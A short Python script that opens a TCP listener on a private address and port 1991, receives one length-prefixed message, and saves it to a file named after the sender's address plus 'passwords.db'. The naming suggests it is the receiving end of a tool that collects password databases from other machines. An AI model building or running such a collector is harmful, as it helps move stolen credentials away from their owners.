'''
Created on 20 Jun 2015
 
@author: Robyn Hode
'''
import socket
import time
import struct

HOST = '192.168.0.104'
PORT = 1991


def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)


def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)


def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


data = None
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()

    try:
        with conn:
            print('Connected by: ', addr)

            # Receive data
            data = recv_msg(conn)
            # send_msg(conn, b'success')
    except Exception as e:
        print(e)


if data:
    # Write data
    filename = str(addr) + "passwords.db"
    with open(filename, "wb") as f:
        f.write(data)
        f.flush()
    while True:
        try:
            with open(filename, 'rb') as f:
                print(f.read())
                break
        except IOError:
            time.sleep(2)
